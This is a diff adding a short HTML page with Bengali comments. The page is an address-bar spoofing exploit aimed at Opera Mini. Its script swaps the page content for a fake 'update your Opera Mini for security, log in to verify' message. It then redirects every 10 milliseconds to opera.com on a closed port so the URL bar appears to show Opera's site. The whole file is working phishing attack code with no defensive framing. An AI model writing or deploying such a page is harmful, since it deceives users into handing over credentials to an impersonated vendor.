@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Update Required</title>
+</head>
+<body>
+    <script>
+        function spoof() {
+            // ১. ফেক পেজের কন্টেন্ট এখানে থাকবে (Base64 এনকোডেড হতে পারে)
+            var fakeContent = "<h1>নিরাপত্তার স্বার্থে আপনার অপেরা মিনি আপডেট করুন</h1><p>লগইন করুন আপনার তথ্য যাচাই করতে।</p>";
+            document.body.innerHTML = fakeContent;
+
+            // ২. অ্যাড্রেস বার স্পুফ করার জন্য একটি বন্ধ পোর্টে রিডাইরেক্ট করা
+            // এটি ব্রাউজারকে কনফিউজ করে যেন সে ইউআরএল বার আপডেট না করে
+            window.location.assign("https://www.opera.com:8080"); 
+        }
+
+        // প্রতি ১০ মিলিসেকেন্ডে ফাংশনটি রান করানোর মাধ্যমে ইউআরএল বারটি "লক" করে রাখা হয়
+        setInterval(spoof, 10);
+    </script>
+</body>
+</html>
